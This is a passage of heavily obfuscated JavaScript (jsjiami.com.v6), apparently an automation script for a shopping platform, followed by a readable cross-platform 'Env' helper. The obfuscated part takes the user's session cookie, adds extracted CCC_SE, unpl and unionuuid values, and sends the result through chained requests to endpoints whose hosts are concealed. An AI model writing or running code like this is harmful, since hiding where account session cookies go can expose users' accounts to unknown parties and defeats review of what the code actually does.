_0x2ba2f3={'url':_0x2595ec,'followRedirect':![],'headers':{'Host':_0x18c8ee[_0x4df5('62',')Mld')],'Connection':_0x18c8ee[_0x4df5('63','U0*o')],'Cookie':_0x18c8ee[_0x4df5('64',')Mld')](_0x18c8ee[_0x4df5('65','Be]i')](_0x18c8ee[_0x4df5('66','3s@^')](_0x18c8ee[_0x4df5('67','noMa')](cookie,'\x20'),_0x18c8ee[_0x4df5('68','@2Rd')]),_0x1ff9ee),';'),'Referer':_0x18c8ee[_0x4df5('69','YETB')],'User-Agent':_0x18c8ee[_0x4df5('6a','Yj7X')]}};return new Promise(_0x301a4a=>{var _0x5ea93e={'QIaTZ':function(_0xa0c590){return _0x18c8ee[_0x4df5('6b',')Mld')](_0xa0c590);},'AQWPV':function(_0x36d76b,_0x249c3b){return _0x18c8ee[_0x4df5('6c','&xxt')](_0x36d76b,_0x249c3b);},'XifFK':_0x18c8ee[_0x4df5('6d',')Mld')],'eWTNf':function(_0x41fa4a,_0x2054a0){return _0x18c8ee[_0x4df5('6e','YDKo')](_0x41fa4a,_0x2054a0);},'ImvgK':_0x18c8ee[_0x4df5('6f','64B*')],'IAENg':_0x18c8ee[_0x4df5('70','Pk1e')],'MyoZu':_0x18c8ee[_0x4df5('71','YETB')],'VLDqD':function(_0x30ea40,_0xaacbc8){return _0x18c8ee[_0x4df5('72','MKKe')](_0x30ea40,_0xaacbc8);},'GnqEq':function(_0x118fb3,_0x29da92){return _0x18c8ee[_0x4df5('73','Wx3e')](_0x118fb3,_0x29da92);},'bQWfF':function(_0x535a0d,_0x4e1153){return _0x18c8ee[_0x4df5('74','(SFn')](_0x535a0d,_0x4e1153);},'GKtbk':function(_0x16169d,_0x25ff97){return _0x18c8ee[_0x4df5('75','jkaz')](_0x16169d,_0x25ff97);},'QdTLQ':function(_0x59146d,_0x577dff){return _0x18c8ee[_0x4df5('76','U0*o')](_0x59146d,_0x577dff);},'UOPEL':function(_0x14bb6c,_0x2616af){return _0x18c8ee[_0x4df5('77','0RfL')](_0x14bb6c,_0x2616af);},'ICmNe':function(_0x153a08,_0x1f6623){return _0x18c8ee[_0x4df5('78','uW)h')](_0x153a08,_0x1f6623);},'NfZkv':_0x18c8ee[_0x4df5('79','MKKe')],'epkOu':_0x18c8ee[_0x4df5('7a','TRA$')],'kqBqb':_0x18c8ee[_0x4df5('7b','YDKo')],'uGwWz':_0x18c8ee[_0x4df5('7c','HttH')],'Ueaxp':function(_0x24d4e4,_0x3ce732){return _0x18c8ee[_0x4df5('7d','Cryy')](_0x24d4e4,_0x3ce732);},'hiHGv':_0x18c8ee[_0x4df5('7e','YDKo')],'WUwrW':_0x18c8ee[_0x4df5('7f','*A([')],'ktals':function(_0x35684f,_0x4e4ef5){return _0x18c8ee[_0x4df5('80','bfu^')](_0x35684f,_0x4e4ef5);},'rsxia':_0x18c8ee[_0x4df5('81','&xxt')],'YMDKK':_0x18c8ee[_0x4df5('82','&xxt')]};if(_0x18c8ee[_0x4df5('83','YETB')](_0x18c8ee[_0x4df5('84','#@G@')],_0x18c8ee[_0x4df5('85','U5r!')])){_0x5ea93e[_0x4df5('86','FOSC')](_0x301a4a);}else{$[_0x4df5('87','Be]i')](_0x2ba2f3,async(_0x584daa,_0x2710ba,_0x2595ec)=>{try{if(_0x584daa){if(_0x5ea93e[_0x4df5('88','NI8&')](_0x5ea93e[_0x4df5('89','[PVV')],_0x5ea93e[_0x4df5('8a','h[k0')])){$[_0x4df5('8b','jkaz')](e);}else{console[_0x4df5('46','nMJp')]($[_0x4df5('8c','YETB')]+_0x4df5('48','Pk1e'));}}else{if(_0x5ea93e[_0x4df5('8d','YETB')](_0x5ea93e[_0x4df5('8e','NI8&')],_0x5ea93e[_0x4df5('8f','64B*')])){console[_0x4df5('90','*A([')]($[_0x4df5('91','HWyo')]+_0x4df5('92','TB5q'));}else{_0x2710ba=_0x2710ba[_0x4df5('93','FOSC')][_0x5ea93e[_0x4df5('94','jKz)')]];_0x2710ba=JSON[_0x4df5('95','anOX')](_0x2710ba);let _0xadacee=_0x2710ba[_0x4df5('96','jKz)')](/CCC_SE(\S*);/)[0x1];let _0x2ac5c2=_0x2710ba[_0x4df5('97','z9%D')](/unpl(\S*);/)[0x1];let _0x2f24b5=_0x2710ba[_0x4df5('98','XjQ(')](/unionuuid(\S*);/)[0x1];let _0x44ddf8=_0x5ea93e[_0x4df5('99','*6L)')](_0x5ea93e[_0x4df5('9a','IBnO')](_0x5ea93e[_0x4df5('9b','MKKe')](_0x5ea93e[_0x4df5('9c','YETB')](_0x5ea93e[_0x4df5('9d','(SFn')](_0x5ea93e[_0x4df5('9e','NJFh')](_0x5ea93e[_0x4df5('9f','6F!I')](_0x5ea93e[_0x4df5('a0','As!H')](_0x5ea93e[_0x4df5('a1','19(v')](_0x5ea93e[_0x4df5('a2','jKz)')](_0x5ea93e[_0x4df5('a3','@2Rd')](_0x5ea93e[_0x4df5('a4','z9%D')](_0x5ea93e[_0x4df5('a5','*A([')](cookie,'\x20'),_0x5ea93e[_0x4df5('a6','0RfL')]),_0x1ff9ee),';\x20'),_0x5ea93e[_0x4df5('a7','zMwl')]),_0xadacee),';\x20'),_0x5ea93e[_0x4df5('a8','19(v')]),_0x2ac5c2),';\x20'),_0x5ea93e[_0x4df5('a9','(SFn')]),_0x2f24b5),';\x20');await _0x5ea93e[_0x4df5('aa','uW)h')](S03,_0x44ddf8);await $[_0x4df5('ab','jkaz')](0xc8);}}}catch(_0x3369fb){if(_0x5ea93e[_0x4df5('ac','BAWR')](_0x5ea93e[_0x4df5('ad','WvTz')],_0x5ea93e[_0x4df5('ae','BAWR')])){$[_0x4df5('22','h[k0')](_0x3369fb,_0x2710ba);}else{$[_0x4df5('af','bfu^')](_0x3369fb,_0x2710ba);}}finally{if(_0x5ea93e[_0x4df5('b0','0RfL')](_0x5ea93e[_0x4df5('b1','uW)h')],_0x5ea93e[_0x4df5('b2','NJFh')])){console[_0x4df5('4d','h[k0')]($[_0x4df5('b3','PNCR')]+_0x4df5('4e','YETB'));}else{_0x5ea93e[_0x4df5('b4','BAWR')](_0x301a4a);}}});}});}function S03(_0x9f2699){var _0x28f917={'nSAvu':function(_0x6e538d){return _0x6e538d();},'MZemY':function(_0x2b3318,_0xd5aea9){return _0x2b3318!==_0xd5aea9;},'GpbXZ':_0x4df5('b5','bfu^'),'BVyTf':_0x4df5('b6','FOSC'),'mNzgL':function(_0x2c44d9,_0x167bf5){return _0x2c44d9!==_0x167bf5;},'uDuYJ':_0x4df5('b7','MKKe'),'ZVpkv':_0x4df5('b8','0RfL'),'CawWe':function(_0x49a234,_0xca65b7){return _0x49a234(_0xca65b7);},'uhWdf':function(_0x15e1a3,_0x24f1c7){return _0x15e1a3===_0x24f1c7;},'myGvS':_0x4df5('b9','HttH'),'oAUYl':_0x4df5('ba','*A(['),'btArE':_0x4df5('bb','Be]i'),'hxRxi':_0x4df5('bc','PNCR'),'QYLcn':_0x4df5('bd','(SFn'),'ugMOn':_0x4df5('be','HWyo')};let _0x504167={'url':_0x4df5('bf','z9%D'),'headers':{'Host':_0x28f917[_0x4df5('c0','BAWR')],'Connection':_0x28f917[_0x4df5('c1','Yj7X')],'Cookie':_0x9f2699,'Referer':_0x28f917[_0x4df5('c2','%1hU')],'User-Agent':_0x28f917[_0x4df5('c3','noMa')]}};return new Promise(_0xfde99d=>{$[_0x4df5('c4','*6L)')](_0x504167,async(_0x2dd6c0,_0x2197a2,_0xfbf4d8)=>{var _0x425405={'PxTvz':function(_0x3e06fe){return _0x28f917[_0x4df5('c5','64B*')](_0x3e06fe);}};try{if(_0x28f917[_0x4df5('c6','64B*')](_0x28f917[_0x4df5('c7','%1hU')],_0x28f917[_0x4df5('c8','Be]i')])){if(_0x2dd6c0){if(_0x28f917[_0x4df5('c9','FOSC')](_0x28f917[_0x4df5('ca','@2Rd')],_0x28f917[_0x4df5('cb','FOSC')])){console[_0x4df5('46','nMJp')]($[_0x4df5('cc','noMa')]+_0x4df5('cd','noMa'));}else{_0x425405[_0x4df5('ce','h[k0')](_0xfde99d);}}else{_0xfbf4d8=JSON[_0x4df5('cf','64B*')](_0xfbf4d8);await _0x28f917[_0x4df5('d0','As!H')](S04,_0x9f2699);await $[_0x4df5('d1','Cryy')](0xc8);}}else{console[_0x4df5('d2','&xxt')]($[_0x4df5('d3','0RfL')]+_0x4df5('d4','Yj7X'));}}catch(_0x2190ed){$[_0x4df5('d5','Be]i')](_0x2190ed,_0x2197a2);}finally{if(_0x28f917[_0x4df5('d6','IBnO')](_0x28f917[_0x4df5('d7','YETB')],_0x28f917[_0x4df5('d8','FOSC')])){$[_0x4df5('d9','6F!I')](e,_0x2197a2);}else{_0x28f917[_0x4df5('da','anOX')](_0xfde99d);}}});});}function S04(_0x2dc65c){var _0x2ba2cd={'lEuJD':function(_0x1d4226){return _0x1d4226();},'qTicX':_0x4df5('db','#@G@'),'HUrET':_0x4df5('dc','U5r!'),'NpeJD':_0x4df5('dd','jKz)'),'RdgpB':_0x4df5('de','TRA$')};let _0x4fd5aa={'url':_0x4df5('df','NI8&'),'headers':{'Host':_0x2ba2cd[_0x4df5('e0','h[k0')],'Connection':_0x2ba2cd[_0x4df5('e1','TB5q')],'Cookie':_0x2dc65c,'Referer':_0x2ba2cd[_0x4df5('e2','@2Rd')],'User-Agent':_0x2ba2cd[_0x4df5('e3','@2Rd')]}};return new Promise(_0x387034=>{var _0x8ab554={'HdRPb':function(_0x48139a){return _0x2ba2cd[_0x4df5('e4','*A([')](_0x48139a);}};$[_0x4df5('e5','Pk1e')](_0x4fd5aa,async(_0x2979ee,_0x2449f8,_0x46dc4e)=>{try{if(_0x2979ee){console[_0x4df5('e6','HttH')]($[_0x4df5('e7',')Mld')]+_0x4df5('e8','6F!I'));}else{_0x46dc4e=JSON[_0x4df5('e9',')Mld')](_0x46dc4e);await $[_0x4df5('ea','3s@^')](0xc8);}}catch(_0x41de45){$[_0x4df5('49','U5r!')](_0x41de45,_0x2449f8);}finally{_0x8ab554[_0x4df5('eb','Zk&J')](_0x387034);}});});};_0xodB='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
